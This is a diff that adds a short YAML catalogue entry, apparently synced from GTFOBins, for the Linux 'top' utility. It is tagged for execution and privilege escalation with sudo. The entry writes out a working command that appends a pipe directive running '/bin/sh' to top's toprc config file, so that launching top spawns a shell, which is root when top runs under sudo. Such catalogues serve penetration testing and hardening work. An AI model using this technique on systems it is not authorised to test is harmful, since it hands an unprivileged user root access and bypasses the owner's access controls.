@@ -1,0 +1,31 @@
+id: gtfobins/top/shell/sudo
+type: binary
+platform: linux
+name: top
+phases:
+- execution
+- privilege-escalation
+capabilities:
+- shell
+privilege_required: sudo
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: 'echo -e ''pipe\tx\texec /bin/sh 1>&0 2>&0'' >>~/.config/procps/toprc
+
+    top
+
+    # press return twice
+
+    reset'
+  comment: The config path might be different.
+references:
+- https://gtfobins.github.io/gtfobins/top/
+tags:
+- linux
+- unix
+- gtfobins
